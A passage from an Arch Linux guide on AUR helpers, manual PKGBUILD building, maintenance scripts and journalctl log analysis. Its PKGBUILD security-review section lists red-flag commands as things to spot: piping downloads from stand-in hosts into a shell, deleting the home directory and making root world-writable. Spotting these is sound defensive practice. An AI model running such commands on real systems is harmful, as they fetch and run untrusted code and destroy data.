yay -G package-name
cd package-name
nano PKGBUILD
makepkg -si
```

**Build without installing:**
```
makepkg -s
```

Package file created in current directory.

### Troubleshooting Workflow

#### Build Failures

**Check build output:**
```
yay -S package-name 2>&1 | tee build.log
```

Saves output to file for analysis.

**Clean and retry:**
```
yay -Sc               # Clean cache
yay -S package-name --rebuild
```

**Check AUR comments:**
Visit `https://aur.archlinux.org/packages/package-name` and read comments for known issues and fixes.

#### Dependency Conflicts

**Install dependencies manually:**
```
yay -S dependency-name
yay -S package-name
```

**Skip dependency checks (dangerous):**
```
makepkg -si --nodeps
```

Only use if you understand the dependency tree.

#### PGP Key Issues

**Import missing keys:**
```
gpg --recv-keys KEY_ID
```

**From AUR helper:**
```
yay -S package-name
# When prompted, yay can import keys automatically
```

#### Version Conflicts

**Force downgrade:**
```
yay -U /path/to/old-package.pkg.tar.zst
```

**Hold package version:**
```
# Add to /etc/pacman.conf
IgnorePkg = package-name
```

### Best Practices Workflow

#### Daily/Weekly Workflow

**1. Check Arch news:**
```
# Visit https://archlinux.org/news/
# Or with paru:
paru -Pww
```

**2. Update system:**
```
yay -Syu
```

**3. Review PKGBUILDs:**
Always review when prompted.

**4. Clean orphans:**
```
yay -Yc
# or
paru -c
```

**5. Check for issues:**
```
systemctl --failed
journalctl -p err -b
```

#### Monthly Workflow

**1. Full development update:**
```
yay -Syu --devel
```

**2. Clean caches:**
```
yay -Sc
sudo paccache -rk3
```

**3. Rebuild problematic packages:**
```
yay -S problematic-package --rebuild
```

**4. Review installed AUR packages:**
```
pacman -Qm
```

Remove packages no longer needed.

#### Before Major Changes

**1. Create backup/snapshot:**
```
sudo timeshift --create
```

**2. Read package comments:**
Check AUR pages for recent issues.

**3. Update keyring first:**
```
sudo pacman -Sy archlinux-keyring
```

**4. Proceed with update:**
```
yay -Syu
```

### Automation and Scripts

#### Update Script with Safety Checks

```bash
#!/bin/bash
# Safe AUR helper update script

echo "=== Arch Linux Update Script ==="

# 1. Check Arch news
echo "Check Arch news: https://archlinux.org/news/"
read -p "Continue with update? (y/n): " CONT
[ "$CONT" != "y" ] && exit 0

# 2. Create snapshot if available
if command -v timeshift &>/dev/null; then
    echo "Creating snapshot..."
    sudo timeshift --create --comments "Pre-update $(date +%Y%m%d)"
fi

# 3. Update keyring
echo "Updating keyring..."
sudo pacman -Sy archlinux-keyring

# 4. System update
echo "Starting system update..."
yay -Syu

# 5. Clean orphans
echo "Removing orphans..."
yay -Yc --noconfirm

# 6. Check for issues
echo "Checking for failed services..."
systemctl --failed

echo "=== Update complete ==="
```

#### Weekly Maintenance Script

```bash
#!/bin/bash
# Weekly maintenance with AUR helper

# Update all packages including development
yay -Syu --devel --noconfirm

# Clean package caches
yay -Sc --noconfirm
sudo paccache -rk2

# Clean orphans
yay -Yc --noconfirm

# Clean journal
sudo journalctl --vacuum-time=2weeks

# Report
echo "=== Maintenance Complete ==="
echo "System size: $(df -h / | tail -1 | awk '{print $3}')"
echo "Cache size: $(du -sh ~/.cache/yay/ | cut -f1)"
```

### Comparing yay and paru Workflows

#### yay Workflow

**Strengths:**
- Simple pacman-like syntax
- Good default behavior
- Easy to learn
- Widely used and documented

**Typical yay session:**
```
yay -Syu                    # Update everything
yay -Ss package             # Search
yay -S package              # Install
yay -G package              # Download PKGBUILD
yay -Yc                     # Clean orphans
```

#### paru Workflow

**Strengths:**
- News checking built-in
- Batch PKGBUILD review
- Clean chroot builds available
- More advanced features

**Typical paru session:**
```
paru -Syu                   # Update with news check
paru -Ss package            # Search
paru -S package             # Install with review
paru -G package             # Clone repo
paru -c                     # Clean orphans
```

### Best Practices Summary

**Always review PKGBUILDs:** Never skip security review of AUR packages.

**Update regularly:** Frequent small updates are safer than large infrequent ones.

**Read AUR comments:** Community often reports issues before you encounter them.

**Keep one helper:** Use either yay or paru, not both simultaneously.

**Clean regularly:** Remove build caches and orphaned packages.

**Rebuild after library updates:** Especially for packages using shared libraries.

**Check news before updating:** Manual interventions are announced on Arch news.

**Use development updates sparingly:** Only when you need latest changes.

**Backup before major changes:** System snapshots save time if issues arise.

**Report issues:** Help the community by commenting on AUR packages.

AUR helpers significantly streamline working with community packages while maintaining the security and quality advantages of manual review and pacman integration.

## Manual AUR Package Building

### Overview

Building AUR packages manually without helpers provides complete control over the build process, ensures you understand what's being installed, and is essential for security-conscious users or when AUR helpers fail. This is the traditional, recommended method by Arch Linux developers.

### Prerequisites

#### Essential Tools

**Install base-devel:**
```
sudo pacman -S base-devel
```

**base-devel includes:**
- gcc (compiler)
- make
- automake
- autoconf
- binutils
- fakeroot
- pkg-config
- Other build essentials

**Install git:**
```
sudo pacman -S git
```

Needed for cloning AUR repositories.

#### Understanding the Build Process

**Manual build workflow:**
1. Find package on AUR website
2. Clone package repository
3. Review PKGBUILD and files
4. Build package with makepkg
5. Install with pacman

### Finding AUR Packages

#### AUR Website

**Browse AUR:**
```
https://aur.archlinux.org/
```

**Search for packages:**
- Use search box at top
- Filter by name, description, maintainer
- View package details, votes, popularity

**Package page shows:**
- PKGBUILD link
- Git clone URL
- Dependencies
- Comments
- Package votes and popularity
- Maintainer information
- Last updated date

### Downloading Package Files

#### Clone AUR Repository

**Using git (recommended):**
```
git clone https://aur.archlinux.org/package-name.git
cd package-name
```

**Alternative - download snapshot:**
```
wget https://aur.archlinux.org/cgit/aur.git/snapshot/package-name.tar.gz
tar -xzf package-name.tar.gz
cd package-name
```

#### Repository Contents

**Typical AUR package structure:**
```
package-name/
├── .SRCINFO          # Package metadata
├── PKGBUILD          # Build instructions
├── .gitignore        # Git ignore file
└── additional files  # Patches, configs, etc.
```

### Reviewing PKGBUILD

#### What is a PKGBUILD?

**Bash script containing:**
- Package metadata (name, version, description)
- Source file URLs
- Dependencies
- Build instructions (functions)
- Installation instructions

#### Essential PKGBUILD Components

**Meta**
```bash
pkgname=package-name
pkgver=1.0.0
pkgrel=1
pkgdesc="Package description"
arch=('x86_64')
url="https://project.homepage.com"
license=('GPL')
```

**Dependencies:**
```bash
depends=('dependency1' 'dependency2')
makedepends=('build-tool1' 'build-tool2')
optdepends=('optional-dep: for feature')
```

**Sources:**
```bash
source=("https://example.com/source-$pkgver.tar.gz"
        "local-patch.patch")
sha256sums=('abc123...'
            'def456...')
```

**Build functions:**
```bash
prepare() {
    # Prepare source (apply patches, etc.)
}

build() {
    # Compile the software
}

package() {
    # Install to package directory
}
```

#### Security Review

**Check source URLs:**
```bash
source=("https://github.com/project/archive/$pkgver.tar.gz")
```

Verify URLs point to official project repositories.

**Look for suspicious commands:**
```bash
# Red flags:
curl http://untrusted.com/script | bash
wget -qO- http://site.com | sh
rm -rf $HOME
chmod 777 /
```

**Verify checksums:**
```bash
sha256sums=('abc123...')
```

Checksums prevent tampered downloads.

**Review build commands:**
```bash
build() {
    ./configure --prefix=/usr
    make
}
```

Standard build commands are safe.

**Check install commands:**
```bash
package() {
    cd "$srcdir/$pkgname-$pkgver"
    make DESTDIR="$pkgdir" install
}
```

Should only install to `$pkgdir`, not system directly.

#### Reading the PKGBUILD

**View entire file:**
```
cat PKGBUILD
less PKGBUILD
```

**Check specific sections:**
```
grep "^source=" PKGBUILD
grep "^depends=" PKGBUILD
```

**Syntax highlighting:**
```
vim PKGBUILD
nano PKGBUILD
```

### Building the Package

#### Basic Build Command

**Build with dependency installation:**
```
makepkg -s
```

The `-s` flag automatically installs missing dependencies.

**Common makepkg flags:**
```
-s, --syncdeps     Install missing dependencies
-i, --install      Install package after building
-c, --clean        Clean up work files after build
-r, --rmdeps       Remove build dependencies after build
-f, --force        Overwrite existing package
```

#### Complete Build and Install

**Build, install, and cleanup:**
```
makepkg -si
```

**Most comprehensive:**
```
makepkg -sri
```

Flags:
- `-s` - Install dependencies
- `-r` - Remove build deps after
- `-i` - Install built package

#### Build Process Steps

**What makepkg does:**

**1. Preparation:**
- Downloads source files
- Verifies checksums
- Extracts archives

**2. Build:**
- Runs prepare() function
- Runs build() function
- Compiles software

**3. Package:**
- Runs package() function
- Creates package tarball
- Generates .SRCINFO

**4. Installation (with -i):**
- Calls pacman to install
- Registers in database

#### Output Location

**Default:**
```
./package-name-version-arch.pkg.tar.zst
```

Package created in current directory.

**Custom location:**
Set in `~/.makepkg.conf`:
```
PKGDEST=~/packages
```

### Handling Dependencies

#### Installing Dependencies

**Automatic with -s flag:**
```
makepkg -s
```

Installs dependencies from official repos.

**Manual installation:**
```
# Check dependencies
grep "depends=" PKGBUILD
grep "makedepends=" PKGBUILD

# Install manually
sudo pacman -S dependency1 dependency2
```

#### AUR Dependencies

**If dependency is also in AUR:**

```
# Build dependency first
git clone https://aur.archlinux.org/aur-dependency.git
cd aur-dependency
makepkg -si

# Return to main package
cd ../package-name
makepkg -si
```

**Dependency chain:**
Build and install AUR dependencies in correct order.

### Installing the Built Package

#### Using Pacman

**Install from package file:**
```
sudo pacman -U package-name-version-arch.pkg.tar.zst
```

**Or if makepkg succeeded:**
```
makepkg -i
```

Automatically installs after building.

#### Installation Options

**Install as dependency:**
```
sudo pacman -U --asdeps package.pkg.tar.zst
```

Marks package as dependency, not explicitly installed.

**Reinstall/upgrade:**
```
sudo pacman -U package.pkg.tar.zst
```

Works for both new installation and upgrades.

### Updating AUR Packages

#### Check for Updates

**Navigate to package directory:**
```
cd ~/aur/package-name
```

**Pull latest changes:**
```
git pull
```

**Check what changed:**
```
git log
git diff HEAD@{1}
```

#### Rebuild and Update

**Standard update process:**
```
cd ~/aur/package-name
git pull
cat PKGBUILD  # Review changes
makepkg -si
```

**Clean rebuild:**
```
makepkg -Ccsi
```

Flags:
- `-C` - Clean previous build artifacts
- `-c` - Clean after build
- `-s` - Install dependencies
- `-i` - Install package

### Customizing PKGBUILDs

#### When to Modify

**Valid reasons:**
- Adding custom patches
- Changing compile flags
- Adjusting installation paths
- Enabling/disabling features

**Example modification:**
```bash
# Original PKGBUILD
./configure --prefix=/usr

# Modified for custom features
./configure --prefix=/usr --enable-feature --disable-other
```

#### Making Local Changes

**Edit PKGBUILD:**
```
nano PKGBUILD
```

**Common customizations:**

**Add custom patches:**
```bash
source+=("my-patch.patch")
sha256sums+=('abc123...')

prepare() {
    patch -p1 < "$srcdir/my-patch.patch"
}
```

**Change compile options:**
```bash
build() {
    CFLAGS="-O3 -march=native" ./configure --prefix=/usr
    make
}
```

**Skip tests:**
```bash
# Comment out check() function
# check() {
#     make test
# }
```

#### Generating Updated Checksums

**After modifying sources:**
```
updpkgsums
```

Or:
```
makepkg -g >> PKGBUILD
```

Updates checksums in PKGBUILD.

### Working with Different Package Types

#### Binary Packages (-bin)

**Pre-compiled software:**
```bash
# PKGBUILD typically downloads binary
source=("https://example.com/program-$pkgver-linux-x64.tar.gz")

package() {
    # Just copy files, no compilation
    install -Dm755 program "$pkgdir/usr/bin/program"
}
```

**Build is faster:** No compilation step.

#### Development Packages (-git)

**Build from latest source:**
```bash
pkgver() {
    cd "$srcdir/$pkgname"
    git describe --long --tags | sed 's/^v//;s/-/.r/;s/-/./g'
}

source=("git+https://github.com/project/repo.git")
```

**Always latest:** Version updates on each build.

**Rebuild to update:**
```
makepkg -Ccsi
```

### Build Directory Management

#### Build Locations

**Working directory:**
```
src/         # Extracted sources
pkg/         # Packaged files
```

**Clean build artifacts:**
```
makepkg -c   # After successful build
makepkg -C   # Before building
```

#### Cache Management

**makepkg downloads to:**
```
~/.cache/makepkg/
```

Or custom:
```
# ~/.makepkg.conf
SRCDEST=~/makepkg/sources
```

**Clean old sources:**
```
rm -rf ~/.cache/makepkg/
```

### Troubleshooting Build Issues

#### Checksum Failures

**Error:**
```
==> Verifying source file signatures with gpg...
    source.tar.gz ... FAILED (invalid PGP signature)
```

**Solutions:**

**Import missing key:**
```
gpg --recv-keys KEY_ID
```

**Skip verification (insecure):**
```
makepkg --skippgpcheck
```

**Update checksums:**
```
updpkgsums
```

#### Compilation Errors

**Missing dependencies:**
```
configure: error: Package 'libfoo' not found
```

**Solution:**
```
sudo pacman -S libfoo
makepkg -s
```

**C++ compiler issues:**
```
# Add to PKGBUILD
makedepends+=('gcc')
```

#### Space Issues

**Insufficient disk space:**
```
error: failed to extract source
```

**Check available space:**
```
df -h .
```

**Clean and retry:**
```
makepkg -C
df -h .
makepkg -s
```

### Best Practices

#### Organization

**Dedicated AUR directory:**
```
mkdir -p ~/aur
cd ~/aur
git clone https://aur.archlinux.org/package.git
```

**Track packages:**
```
ls ~/aur/
```

Shows all AUR packages you've built.

#### Security

**Always review PKGBUILDs:** Never build without reading the PKGBUILD first.

**Check AUR comments:** Read package comments for known issues or security concerns.

**Verify sources:** Ensure source URLs are legitimate project repositories.

**Import keys properly:** Verify PGP keys before importing.

**Use checksums:** Don't skip checksum verification.

#### Maintenance

**Update regularly:**
```
cd ~/aur/package-name
git pull
makepkg -si
```

**Clean old versions:**
```
rm package-name-old-version.pkg.tar.zst
```

**Document modifications:** Keep notes on PKGBUILD changes you made.

### Automation Script

#### Build Script Example

```bash
#!/bin/bash
# Build AUR package with safety checks

PACKAGE="$1"

if [ -z "$PACKAGE" ]; then
    echo "Usage: $0 package-name"
    exit 1
fi

# Create AUR directory if needed
mkdir -p ~/aur
cd ~/aur

# Clone or update
if [ -d "$PACKAGE" ]; then
    echo "Updating $PACKAGE..."
    cd "$PACKAGE"
    git pull
else
    echo "Cloning $PACKAGE..."
    git clone "https://aur.archlinux.org/${PACKAGE}.git"
    cd "$PACKAGE"
fi

# Review PKGBUILD
echo "=== PKGBUILD Review ==="
cat PKGBUILD
echo "===================="
read -p "Proceed with build? (y/n): " ANSWER

if [ "$ANSWER" != "y" ]; then
    echo "Build cancelled"
    exit 0
fi

# Build and install
makepkg -si

echo "Build complete!"
```

**Usage:**
```
chmod +x build-aur.sh
./build-aur.sh package-name
```

Manual AUR package building provides complete transparency and control over what software is installed on your system, making it the most secure method for using community packages while maintaining Arch Linux principles of user control and simplicity.

# System Maintenance

## Regular Maintenance Routines

### Overview

Regular maintenance keeps an Arch Linux system clean, secure, and performing optimally. Establishing consistent maintenance routines prevents common issues, manages disk space, and ensures system reliability.

### Daily Maintenance

#### Quick Health Check

**Check for failed services:**
```
systemctl --failed
```

Should show "0 loaded units listed." If services failed, investigate.

**Check system errors:**
```
journalctl -p err -b
```

Shows error-level messages from current boot. Empty output is ideal.

**Check disk space:**
```
df -h /
```

Ensure root partition has at least 20% free space.

**Quick update check:**
```
checkupdates
```

Or:
```
pacman -Qu
```

Shows available updates without installing.

### Weekly Maintenance

#### System Update

**Full system upgrade:**
```
sudo pacman -Syu
```

**With AUR packages (if using helper):**
```
yay -Syu
paru -Syu
```

**Best practice workflow:**

**1. Check Arch news:**
```
# Visit https://archlinux.org/news/
# Or with paru:
paru -Pww
```

**2. Update keyring first (if significant time passed):**
```
sudo pacman -Sy archlinux-keyring
```

**3. Perform update:**
```
sudo pacman -Syu
```

**4. Reboot if kernel updated:**
```
# Check if kernel was updated
grep "upgraded linux" /var/log/pacman.log | tail -1

# Reboot if necessary
sudo reboot
```

#### Remove Orphaned Packages

**List orphans:**
```
pacman -Qtdq
```

Shows packages installed as dependencies but no longer required.

**Remove orphans:**
```
sudo pacman -Rns $(pacman -Qtdq)
```

**With AUR helper:**
```
yay -Yc
paru -c
```

**Example output:**
```
checking dependencies...

Packages (5) old-dep-1.0-1  old-lib-2.0-1  unused-tool-3.0-1

Total Removed Size: 45.2 MiB

:: Do you want to remove these packages? [Y/n]
```

#### Clean Package Cache

**Keep 3 recent versions:**
```
sudo paccache -r
```

**Keep 1 recent version:**
```
sudo paccache -rk1
```

**Remove uninstalled packages from cache:**
```
sudo paccache -ruk0
```

**Check cache size:**
```
du -sh /var/cache/pacman/pkg/
```

**Complete cache cleanup (not recommended):**
```
sudo pacman -Scc
```

Only use when severely limited on space; removes all cached packages.

### Bi-Weekly Maintenance

#### Update AUR Packages

**With AUR helper:**
```
yay -Syu
paru -Syu
```

**Manual update for critical AUR packages:**
```
cd ~/aur/package-name
git pull
cat PKGBUILD  # Review changes
makepkg -si
```

#### System Log Management

**Check journal size:**
```
journalctl --disk-usage
```

**Clean old logs (keep 2 weeks):**
```
sudo journalctl --vacuum-time=2weeks
```

**Clean by size (keep 500MB):**
```
sudo journalctl --vacuum-size=500M
```

**Configure persistent limit:**
```
# Edit /etc/systemd/journald.conf
SystemMaxUse=500M
```

Then restart journald:
```
sudo systemctl restart systemd-journald
```

#### Check Failed Login Attempts

**View failed logins:**
```
journalctl _SYSTEMD_UNIT=sshd.service | grep "Failed password"
```

**Check authentication logs:**
```
journalctl -u systemd-logind -b
```

### Monthly Maintenance

#### Development Package Updates

**Update -git, -svn, -hg packages:**
```
yay -Syu --devel
paru -Syu --devel
```

These packages don't have version numbers, so helpers can't detect updates automatically.

#### Database Optimization

**Check database integrity:**
```
sudo pacman -Dk
```

**Verify package files:**
```
pacman -Qkk | grep -v "0 altered files"
```

Shows packages with modified files.

**Update files database:**
```
sudo pacman -Fy
```

Enables file search with `pacman -F filename`.

#### Mirror List Update

**Update with reflector:**
```
sudo reflector --latest 20 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
```

**Or country-specific:**
```
sudo reflector --country 'United States' --latest 10 --protocol https --sort rate --save /etc/pacman.d/mirrorlist
```

**After updating mirrors:**
```
sudo pacman -Syy
```

#### Clean User Cache

**Check cache sizes:**
```
du -sh ~/.cache/*
```

**Clean specific caches:**
```
# Browser cache
rm -rf ~/.cache/mozilla/
rm -rf ~/.cache/chromium/

# Thumbnail cache
rm -rf ~/.cache/thumbnails/

# AUR helper cache
yay -Sc
paru -Sc
```

**Or clean all user cache (careful):**
```
rm -rf ~/.cache/*
```

### Quarterly Maintenance

#### Full System Cleanup

**Comprehensive cleanup script:**

```bash
#!/bin/bash
# Quarterly maintenance script

echo "=== Arch Linux Quarterly Maintenance ==="

# 1. System update
echo "Updating system..."
sudo pacman -Syu

# 2. Update AUR packages with development
if command -v yay &>/dev/null; then
    echo "Updating AUR packages..."
    yay -Syu --devel
fi

# 3. Remove orphans
echo "Removing orphaned packages..."
ORPHANS=$(pacman -Qtdq)
if [ -n "$ORPHANS" ]; then
    sudo pacman -Rns $ORPHANS
else
    echo "No orphans found"
fi

# 4. Clean package cache
echo "Cleaning package cache..."
sudo paccache -rk2
sudo paccache -ruk0

# 5. Clean journal
echo "Cleaning journal logs..."
sudo journalctl --vacuum-time=4weeks

# 6. Update mirror list
echo "Updating mirror list..."
sudo reflector --latest 20 --protocol https --sort rate --save /etc/pacman.d/mirrorlist

# 7. Verify system integrity
echo "Verifying package database..."
sudo pacman -Dk

# 8. Display statistics
echo ""
echo "=== System Statistics ==="
echo "Disk usage: $(df -h / | tail -1 | awk '{print $5}')"
echo "Package cache: $(du -sh /var/cache/pacman/pkg/ | cut -f1)"
echo "Journal size: $(journalctl --disk-usage | grep -oP 'archived and active journals take up \K.*')"
echo "Installed packages: $(pacman -Q | wc -l)"
echo "Orphaned packages: $(pacman -Qtd | wc -l)"

echo ""
echo "=== Maintenance Complete ==="
```

**Save as `/usr/local/bin/quarterly-maintenance`:**
```
sudo nano /usr/local/bin/quarterly-maintenance
sudo chmod +x /usr/local/bin/quarterly-maintenance
```

**Run quarterly:**
```
quarterly-maintenance
```

#### Rebuild Problematic AUR Packages

**After major library updates:**
```
# List foreign packages
pacman -Qm

# Rebuild all
yay -S $(pacman -Qmq) --rebuild
```

#### Review Installed Packages

**List explicitly installed packages:**
```
pacman -Qe
```

**Review and remove unused:**
```
pacman -Qe | less
# Remove packages you no longer use
sudo pacman -Rns unused-package
```

**Identify large packages:**
```
expac -H M '%m\t%n' | sort -h | tail -20
```

Shows 20 largest packages.

#### Security Audit

**Check for held packages:**
```
grep "^IgnorePkg" /etc/pacman.conf
```

Review if you still need to hold these packages.

**Update held packages if safe:**
```
# Remove from /etc/pacman.conf
sudo pacman -S previously-held-package
```

**Check for outdated AUR packages:**
Visit AUR pages for critical packages and check for updates or security notices.

### Automated Maintenance

#### Systemd Timer for Weekly Updates

**Create service file:**
```
sudo nano /etc/systemd/system/weekly-update.service
```

**Content:**
```ini
[Unit]
Description=Weekly System Update
After=network-online.target

[Service]
Type=oneshot
ExecStart=/usr/bin/pacman -Syu --noconfirm
ExecStart=/usr/bin/paccache -rk3
ExecStart=/usr/bin/journalctl --vacuum-time=2weeks
```

**Create timer file:**
```
sudo nano /etc/systemd/system/weekly-update.timer
```

**Content:**
```ini
[Unit]
Description=Run weekly system update
Requires=weekly-update.service

[Timer]
OnCalendar=Sun 03:00
Persistent=true

[Install]
WantedBy=timers.target
```

**Enable timer:**
```
sudo systemctl enable --now weekly-update.timer
```

**Check timer status:**
```
systemctl list-timers weekly-update.timer
```

#### Pacman Hooks for Automatic Cleanup

**Create cleanup hook:**
```
sudo nano /etc/pacman.d/hooks/cleanup.hook
```

**Content:**
```ini
[Trigger]
Operation = Upgrade
Operation = Install
Operation = Remove
Type = Package
Target = *

[Action]
Description = Cleaning package cache and orphans...
When = PostTransaction
Exec = /bin/sh -c "paccache -rk3; pacman -Qtdq | pacman -Rns --noconfirm - || true"
```

Automatically cleans after every transaction.

### Monitoring and Alerts

#### Check System Health

**Create monitoring script:**
```bash
#!/bin/bash
# System health check

# Failed services
FAILED=$(systemctl --failed --no-legend | wc -l)
[ $FAILED -gt 0 ] && echo "WARNING: $FAILED failed services"

# Disk space
USAGE=$(df / | tail -1 | awk '{print $5}' | sed 's/%//')
[ $USAGE -gt 80 ] && echo "WARNING: Root partition ${USAGE}% full"

# Updates available
UPDATES=$(checkupdates 2>/dev/null | wc -l)
[ $UPDATES -gt 0 ] && echo "INFO: $UPDATES updates available"

# System errors today
ERRORS=$(journalctl -p err -S today --no-pager | wc -l)
[ $ERRORS -gt 0 ] && echo "WARNING: $ERRORS errors logged today"
```

**Schedule daily:**
```
0 9 * * * /usr/local/bin/health-check | mail -s "System Health" you@email.com
```

### Backup Routines

#### Configuration Backup

**Weekly config backup:**
```bash
#!/bin/bash
# Backup important configs

BACKUP_DIR="/backup/configs/$(date +%Y%m%d)"
mkdir -p "$BACKUP_DIR"

# Backup critical directories
tar -czf "$BACKUP_DIR/etc.tar.gz" /etc
tar -czf "$BACKUP_DIR/home-configs.tar.gz" ~/.config ~/.bashrc ~/.zshrc

# Keep only last 12 backups
find /backup/configs/ -maxdepth 1 -type d -mtime +90 -exec rm -rf {} \;
```

#### System Snapshot

**Using Timeshift (recommended):**
```
sudo timeshift --create --comments "Weekly backup"
```

**Using Btrfs snapshots:**
```
sudo btrfs subvolume snapshot / /.snapshots/$(date +%Y%m%d)
```

### Maintenance Checklist

#### Weekly Checklist

- [ ] Check Arch news
- [ ] Update system (`pacman -Syu`)
- [ ] Remove orphans (`pacman -Rns $(pacman -Qtdq)`)
- [ ] Clean package cache (`paccache -r`)
- [ ] Check failed services (`systemctl --failed`)
- [ ] Review system errors (`journalctl -p err -b`)

#### Monthly Checklist

- [ ] Update development packages (`yay -Syu --devel`)
- [ ] Clean journal logs (`journalctl --vacuum-time=2weeks`)
- [ ] Update mirror list (`reflector`)
- [ ] Review installed packages (`pacman -Qe`)
- [ ] Check disk usage (`df -h`)
- [ ] Clean user caches (`~/.cache/`)
- [ ] Verify package integrity (`pacman -Qkk`)

#### Quarterly Checklist

- [ ] Full system cleanup (run maintenance script)
- [ ] Rebuild AUR packages (`yay -S $(pacman -Qmq) --rebuild`)
- [ ] Review held packages (IgnorePkg)
- [ ] Security audit
- [ ] Create system backup/snapshot
- [ ] Review and document system changes
- [ ] Update documentation of installed packages

### Best Practices

**Regular schedule:** Establish consistent maintenance schedule and stick to it.

**Before major changes:** Always update before installing new software or making system changes.

**Monitor logs:** Regularly review system logs for unusual activity.

**Keep backups:** Maintain recent backups or snapshots.

**Document changes:** Keep notes on system modifications and why you made them.

**Test updates:** If possible, test updates on non-critical systems first.

**Read news:** Always check Arch news before major updates.

**Don't automate blindly:** Understand what automated scripts do.

**Clean conservatively:** Don't delete everything; maintain some cache and history.

**Stay current:** Regular small updates are safer than infrequent large ones.

Regular maintenance prevents most common Arch Linux issues, keeps the system running smoothly, and makes problem-solving easier when issues do arise.

## Log Analysis

### Overview

Log analysis is essential for troubleshooting issues, monitoring system health, and understanding system behavior on Arch Linux. Systemd's journalctl and traditional log files provide comprehensive system activity records.

### Systemd Journal (journalctl)

#### Basic Journal Viewing

**View entire journal:**
```
journalctl
```

Displays all logged messages; use arrow keys or Page Up/Down to navigate.

**View recent logs:**
```
journalctl -n 50
```

Shows last 50 entries.

**Follow logs in real-time:**
```
journalctl -f
```

Similar to `tail -f`; shows new entries as they're logged.

**Follow with last 20 lines:**
```
journalctl -fn 20
```

#### Filtering by Time

**Current boot:**
```
journalctl -b
```

Shows logs from current boot session.

**Previous boot:**
```
journalctl -b -1
```

Use `-2`, `-3`, etc., for older boots.

**List available boots:**
```
journalctl --list-boots
```

**Since specific time:**
```
journalctl --since "2025-11-01 10:00:00"
journalctl --since "1 hour ago"
journalctl --since yesterday
journalctl --since today
```

**Until specific time:**
```
journalctl --until "2025-11-01 12:00:00"
```

**Time range:**
```
journalctl --since "2025-11-01" --until "2025-11-02"
```

**Last hour:**
```
journalctl --since "1 hour ago"
```

#### Filtering by Priority

**Priority levels (syslog standard):**
- 0: emerg (emergency)
- 1: alert
- 2: crit (critical)
- 3: err (error)
- 4: warning
- 5: notice
- 6: info
- 7: debug

**Show errors only:**
```
journalctl -p err
```

**Show warnings and above:**
```
journalctl -p warning
```

**Critical messages from current boot:**
```
journalctl -b -p crit
```

**Errors from today:**
```
journalctl -p err --since today
```

#### Filtering by Service/Unit

**Specific service:**
```
journalctl -u sshd.service
```

**Multiple services:**
```
journalctl -u sshd.service -u systemd-logind.service
```

**Kernel messages:**
```
journalctl -k
```

Or:
```
journalctl _TRANSPORT=kernel
```

**All systemd messages:**
```
journalctl _SYSTEMD_UNIT=systemd-journald.service
```

#### Filtering by Process

**By PID:**
```
journalctl _PID=1234
```

**By executable:**
```
journalctl /usr/bin/firefox
```

**By command:**
```
journalctl _COMM=firefox
```

#### Output Formatting

**Verbose output (all fields):**
```
journalctl -o verbose
```

**JSON format:**
```
journalctl -o json
```

**JSON pretty-print:**
```
journalctl -o json-pretty
```

**Short format (default):**
```
journalctl -o short
```

**Cat format (no metadata):**
```
journalctl -o cat
```

**Timestamped:**
```
journalctl -o short-iso
```

ISO 8601 timestamps.

### Common Troubleshooting Queries

#### Boot Issues

**Check last boot errors:**
```
journalctl -b -p err
```

**Boot process messages:**
```
journalctl -b -u systemd-boot
journalctl -b | grep -i boot
```

**Failed to start services:**
```
systemctl --failed
journalctl -u failed-service.service
```

**Kernel panics or crashes:**
```
journalctl -k -p crit
```

#### Service Problems

**Check specific service:**
```
journalctl -u service-name.service -b
```

**Service with errors:**
```
journalctl -u service-name.service -p err
```

**Recent service activity:**
```
journalctl -u service-name.service --since "10 minutes ago"
```

**Follow service logs:**
```
journalctl -u service-name.service -f
```

#### Network Issues

**NetworkManager logs:**
```
journalctl -u NetworkManager -b
```

**DHCP issues:**
```
journalctl -u dhcpcd -b
```

**DNS resolution:**
```
journalctl -u systemd-resolved -b
```

**SSH connection attempts:**
```
journalctl -u sshd.service | grep "Failed password"
```

#### Hardware Issues

**All kernel messages:**
```
journalctl -k
```

**Hardware errors:**
```
journalctl -k -p err
```

**USB device events:**
```
journalctl -k | grep -i usb
```

**Disk/storage issues:**
```
journalctl -k | grep -i "error\|fail" | grep -i "sd\|nvme"
```

#### Authentication and Security

**Failed login attempts:**
```
journalctl _SYSTEMD_UNIT=systemd-logind.service | grep "Failed"
```

**Sudo usage:**
```
journalctl _COMM=sudo
```

**PAM authentication:**
```
journalctl | grep pam
```

**All authentication events:**
```
journalctl -t sshd -t sudo -t login
```

### Package Management Logs

#### Pacman Log File

**Location:**
```
/var/log/pacman.log
```

**View recent operations:**
```
tail -n 100 /var/log/pacman.log
```

**Search for specific package:**
```
grep "package-name" /var/log/pacman.log
```

**Last system upgrade:**
```
grep "starting full system upgrade" /var/log/pacman.log | tail -1
```

**Recently installed packages:**
```
grep "installed" /var/log/pacman.log | tail -20
```

**Recently removed packages:**
```
grep "removed" /var/log/pacman.log | tail -20
```

**Packages updated today:**
```
grep "$(date +%Y-%m-%d)" /var/log/pacman.log | grep "upgraded"
```

**Transaction errors:**
```
grep "error:" /var/log/pacman.log | tail -20
```

**All operations on specific package:**
```
grep -E "(installed|upgraded|removed) package-name" /var/log/pacman.log
```

### Advanced Journal Queries

#### Complex Filtering

**Multiple conditions:**
```
journalctl -u sshd.service -p err --since "1 hour ago"
```

**Exclude specific units:**
```
journalctl -b | grep -v "systemd-udevd"
```

**Boolean logic with grep:**
```
journalctl -b | grep -E "(error|fail|critical)"
```

#### Investigating Specific Issues

**Memory issues:**
```
journalctl -b | grep -i "out of memory\|oom"
```

**Disk full errors:**
```
journalctl -b | grep -i "no space left"
```

**Segmentation faults:**
```
journalctl -b | grep "segfault"
```

**Coredumps:**
```
journalctl -b | grep -i "core dump"
coredumpctl list
```

**Permission denied errors:**
```
journalctl -b | grep -i "permission denied"
```

### Journal Maintenance

#### Check Journal Size

**Disk usage:**
```
journalctl --disk-usage
```

**Example output:**
```
Archived and active journals take up 512.0M in the file system.
```

#### Clean Old Logs

**By time (keep 2 weeks):**
```
sudo journalctl --vacuum-time=2weeks
```

**By size (keep 500MB):**
```
sudo journalctl --vacuum-size=500M
```

**By number of files:**
```
sudo journalctl --vacuum-files=5
```

**Verify cleanup:**
```
journalctl --disk-usage
```

#### Configure Journal Limits

**Edit configuration:**
```
sudo nano /etc/systemd/journald.conf
```

**Common settings:**
```ini
[Journal]
SystemMaxUse=500M
SystemKeepFree=1G
SystemMaxFileSize=100M
MaxRetentionSec=2week
```

**Apply changes:**
```
